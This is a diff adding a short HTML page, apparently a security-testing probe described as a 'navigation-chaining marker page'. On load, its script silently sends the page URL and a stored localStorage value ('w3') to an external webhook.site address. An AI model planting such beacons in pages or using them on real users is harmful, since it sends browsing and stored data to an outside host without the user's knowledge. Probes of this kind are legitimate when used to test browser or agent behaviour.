@@ -1,0 +1,10 @@
+<html><body><script>
+// n1: navigation-chaining marker page
+var SINK = 'https://webhook.site/049dead9-0020-41f4-83e7-942e265e5d6d';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), {mode:'no-cors'}); } catch(e) {}
+}
+beacon('n1-loaded', location.href.slice(0,70));
+try { beacon('n1-ls', 'prev=' + (localStorage.getItem('w3') || 'none')); } catch(e){}
+beacon('n1-done', 'ok');
+</script></body></html>
